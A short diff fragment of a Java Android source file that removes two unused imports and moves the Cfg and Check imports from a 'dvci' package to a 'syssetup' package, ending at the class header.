@@ -3,12 +3,9 @@ package com.android.mm;
 import java.util.ArrayList;
 import java.util.Collections;
 import java.util.Hashtable;
-import java.util.TreeMap;
 
-import com.android.dvci.auto.Cfg;
-import com.android.dvci.util.Check;
-
-import android.content.Context;
+import com.android.syssetup.auto.Cfg;
+import com.android.syssetup.util.Check;
 
 public class M {
 	private static final String TAG = "M";
